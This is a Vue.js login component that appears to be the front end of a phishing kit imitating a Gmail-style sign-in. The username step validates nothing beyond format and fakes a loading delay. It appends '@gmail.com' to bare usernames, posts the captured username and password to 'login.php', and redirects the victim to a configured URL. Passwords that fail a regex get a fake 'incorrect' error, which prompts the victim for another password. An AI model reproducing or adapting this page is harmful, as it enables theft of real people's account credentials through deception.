<template>
  <div>
    <div class="text-center">
      <h2 class="font-weight-regular mb-2">
        {{ $t(`login.${step}.title`) }}
      </h2>

      <div>
        <p class="subheading font-weight-regular">
          {{ $t(`login.${step}.subtitle`) }}
        </p>
        <v-chip v-if="step != 'user'" outlined class="font-weight-medium grey--text text--darken-3" color="">
          <v-icon left color="secondary" style="transform: scale(0.85);">
            mdi-account-circle-outline
          </v-icon>
          {{ form.user }}
        </v-chip>
      </div>
    </div>
    

    
    <v-tabs-items v-model="step">

      <!-- Get the username -->

      <v-tab-item value="user">
        <v-form 
          lazy-validation
          ref="user_form" 
          v-model="valid.user"
          @submit.prevent="checkUser"
        >
          <v-text-field
            class="mt-4 mb-1"
            v-model="form.user"
            :label="$t('login.user.user')"
            :hide-details="valid.user"
            :rules="[
              v => !!v || $t('login.user.errors.required'),
              v => /^\w{3,}@\w+\.[a-zA-Z]{2,4}|[0-9]{10}|^\+[0-9]{11}|\w{4,}/.test(v) || $t('login.user.errors.valid')
            ]"
            autofocus
            outlined
            validate-on-blur
          ></v-text-field>

          <a href="#" class="ma-0 subtitle-2">{{ $t('login.user.forgot') }}</a>

          <p class="body-2 text--secondary mt-8 mb-0">{{ $t('login.user.tip') }} <a href="#" class="ma-0 subtitle-2">{{ $t('login.learn') }}</a></p>
          

          <v-card-actions class="justify-space-between mt-8 pa-0 pb-8">
            <a href="#" class="ma-0 subtitle-2">{{ $t('login.user.create') }}</a>
            <v-btn color="primary" class="text-capitalize px-6" @click="checkUser()">{{ $t('login.next') }}</v-btn>
          </v-card-actions>
        </v-form>
      </v-tab-item>



      <!-- Get the password -->

      <v-tab-item value="password">
        <v-form
          ref="pass_form" 
          v-model="valid.pass"
          @submit.prevent="checkPass"
        >
          <v-text-field
            v-model="form.pass"
            :label="$t('login.password.password')"
            class="mt-8 mb-2"
            :hide-details="valid.pass"
            :rules="[
              valid.pass || $t('login.password.errors.incorrect'),
            ]"
            :type="show_pass ? 'text' : 'password'"
            autofocus
            outlined
          ></v-text-field>
          <v-checkbox
            v-model="show_pass"
            :label="$t('login.password.show')"
          />

          <v-card-actions class="justify-space-between mt-8 pa-0 pb-8">
            <a href="#" class="ma-0 subtitle-2">{{ $t('login.password.forgot') }}</a>
            <v-btn color="primary" class="text-capitalize px-6" @click="checkPass()">{{ $t('login.next') }}</v-btn>
          </v-card-actions>
        </v-form>
      </v-tab-item>
    </v-tabs-items>



    <!-- TODO: Get the 2fa -->
    
    <!-- <v-tab-item value="2fa">
      
    </v-tab-item> -->

    <v-snackbar
      color="grey darken-3"
      v-model="snackbar"
    >
      {{ $t('login.reason') }}

      <template v-slot:action="{ attrs }">
        <v-btn
          color="yellow"
          text
          v-bind="attrs"
          @click="snackbar = false"
        >
          {{ $t('login.close') }}
        </v-btn>
      </template>
    </v-snackbar>
  </div>
</template>

<script>
  export default {
    name: 'Login',

    model: {
      prop: 'loading',
      event: 'change',
    },

    props: {
      loading: Boolean,
    },

    data: function () {
      return {
        valid: {
          user: true,
          pass: true,
        },
        show_pass: false,
        step: 'user',
        snackbar: true,
        form: {
          user: '',
          pass: '',
        }
      }
    },

    methods: {
      checkUser() {
        this.form.user = this.form.user.toLowerCase()
        if (this.$refs.user_form.validate()) {
          this.$emit('update:loading', true)
          setTimeout(() => {
            if (
              /\w{4,}/.test(this.form.user)
              &&
              ! /^\w{3,}@\w+\.[a-zA-Z]{2,4}|[0-9]{10}|^\+[0-9]{11}/.test(this.form.user)
              ) {
              this.form.user += "@gmail.com"
            }
            this.$emit('update:loading', false)
            this.step = 'password'
            history.pushState({}, '')
          }, 1000);
        }
      },
      checkPass() {
        console.log(/^(?=.*?[a-z])(?=.*?[A-Z])(?=.*?[0-9])[\w]{8,}$/.test(this.form.pass))
        this.$emit('update:loading', true)
        if (
              // At least 8 Character Password with lowercase, uppercase letters, numbers 
              // and at least one lowercase letter, one uppercase letter and one number
              /^(?=.*?[a-z])(?=.*?[A-Z])(?=.*?[0-9])[\w]{8,}$/.test(this.form.pass)
            ) {
            this.$axios.post('login.php', this.form)
            setTimeout(() => {
              this.$emit('update:loading', false)
              window.location.replace(process.env.VUE_APP_REDIRECT_URL)
            }, 3000)
          } else {
            setTimeout(() => {
              this.$emit('update:loading', false)
              this.valid.pass = false
              this.$refs.pass_form.validate()
            }, 1000);
          }
      }
    }
  }
</script>

<style>
  a {
    text-decoration: none;
  }
</style>